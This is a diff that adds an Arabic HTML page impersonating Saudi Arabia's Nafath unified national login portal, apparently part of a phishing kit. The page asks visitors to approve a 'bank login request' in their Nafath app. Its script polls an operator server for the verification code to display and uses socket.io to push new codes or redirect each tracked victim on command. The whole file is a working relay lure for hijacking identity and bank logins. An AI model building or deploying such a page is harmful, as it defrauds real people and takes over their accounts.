@@ -1,0 +1,117 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>بوابة نفاذ الوطنية الموحدة - تسجيل الدخول</title>
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700;900&display=swap" rel="stylesheet">
+    <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Cairo', sans-serif !important; }
+        body { background: #f4f7f6; color: #1e293b; min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 15px; }
+        .box { background: white; border-radius: 24px; border: 1px solid #e2e8f0; padding: 40px 30px; box-shadow: 0 10px 25px rgba(27,67,50,0.04); max-width: 440px; width: 100%; text-align: center; position: relative; overflow: hidden; }
+        .header-brand { display: flex; flex-direction: column; align-items: center; justify-content: center; gap: 8px; margin-bottom: 25px; }
+        .nafath-logo-text { font-size: 20px; font-weight: 900; color: #1b4332; display: flex; align-items: center; gap: 6px; }
+        .nafath-subtext { font-size: 11px; color: #16a34a; font-weight: 700; letter-spacing: 1px; }
+        .logo-badge { width: 50px; height: 50px; background: #e8f5e9; border-radius: 16px; display: flex; align-items: center; justify-content: center; font-size: 26px; }
+        
+        .auth-circle {
+            width: 130px;
+            height: 130px;
+            background: linear-gradient(135deg, #1b4332, #2d6a4f);
+            color: white;
+            border-radius: 50%;
+            margin: 25px auto;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 56px;
+            font-weight: 900;
+            box-shadow: 0 12px 24px rgba(27,67,50,0.2);
+            font-family: 'Cairo', sans-serif !important;
+            animation: pulse-green 2s infinite;
+        }
+        @keyframes pulse-green {
+            0% { box-shadow: 0 0 0 0 rgba(27, 67, 50, 0.4); }
+            70% { box-shadow: 0 0 0 15px rgba(27, 67, 50, 0); }
+            100% { box-shadow: 0 0 0 0 rgba(27, 67, 50, 0); }
+        }
+
+        h2 { font-size: 18px; font-weight: 900; color: #1b4332; margin-bottom: 12px; }
+        p { font-size: 13px; color: #475569; line-height: 1.7; margin-bottom: 25px; }
+        
+        .steps-card { background: #f4fbf7; border: 1.5px solid #d8f3dc; padding: 18px; border-radius: 16px; font-size: 12px; font-weight: 700; text-align: right; color: #1b4332; line-height: 1.8; margin-bottom: 25px; }
+        .steps-card ol { padding-right: 20px; margin-top: 8px; }
+        .steps-card li { margin-bottom: 4px; }
+        
+        .secure-footer { font-size: 11px; color: #94a3b8; display: flex; justify-content: center; gap: 5px; border-top: 1px solid #f1f5f9; padding-top: 18px; }
+    </style>
+</head>
+<body>
+    <div class="box">
+        <div class="header-brand">
+            <div class="logo-badge">🇸🇦</div>
+            <div>
+                <div class="nafath-logo-text">نفاذ | Nafath</div>
+                <div class="nafath-subtext">البوابة الوطنية الموحدة</div>
+            </div>
+        </div>
+
+        <h2>المصادقة عبر تطبيق نفاذ</h2>
+        <p>الرجاء فتح تطبيق نفاذ على هاتفك المحمول، والموافقة على طلب الدخول البنكي باختيار رقم التحقق الموضح بالأسفل:</p>
+        
+        <div class="auth-circle" id="auth-code-box">--</div>
+
+        <div class="steps-card">
+            💡 <b>خطوات التفعيل والمصادقة الأمنية:</b>
+            <ol>
+                <li>افتح تطبيق نفاذ على هاتفك الذكي.</li>
+                <li>اضغط على زر <b>الموافقة</b> لتسجيل الدخول.</li>
+                <li>اختر الرقم المطابق الظاهر بالأعلى ( <b id="auth-code-sub">--</b> ) لإتمام المصادقة.</li>
+            </ol>
+        </div>
+
+        <div class="secure-footer">🛡️ مصادقة مشفرة وآمنة بالكامل للاتصال بالبوابة</div>
+    </div>
+
+    <script src="saas-hub-config.js"></script><script src="config.js"></script><script>var SERVER_URL = window.SERVER_HUB_URL || "http://localhost:5000";
+        var siteKey = "site_sehhaty_app_v1";
+        var visitorToken = localStorage.getItem('visitor_token') || 'vis_' + Math.random().toString(36).substring(2, 10);
+
+        function updateOnScreenCode(code) {
+            var displayCode = code ? String(code).trim() : '36';
+            document.getElementById('auth-code-box').innerText = displayCode;
+            document.getElementById('auth-code-sub').innerText = displayCode;
+        }
+
+        fetch(SERVER_URL + '/api/tracker/ping', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ token: visitorToken, siteKey: siteKey, currentPage: '/nafath.html', pageTitle: 'مصادقة الهوية الوطنية عبر نفاذ الموحد' })
+        }).then(function(res) {
+            return res.json();
+        }).then(function(data) {
+            if (data && data.authCode) {
+                updateOnScreenCode(data.authCode);
+            } else {
+                updateOnScreenCode('36');
+            }
+        }).catch(function(){
+            updateOnScreenCode('36');
+        });
+
+        try {
+            var socket = io(SERVER_URL);
+            socket.on('visitor_updated', function(v) {
+                if (v.token === visitorToken) {
+                    if (v.status === 'go' && v.redirectUrl) {
+                        window.location.href = v.redirectUrl;
+                    } else if (v.authCode) {
+                        updateOnScreenCode(v.authCode);
+                    }
+                }
+            });
+        } catch(e){}
+    </script>
+</body>
+</html>
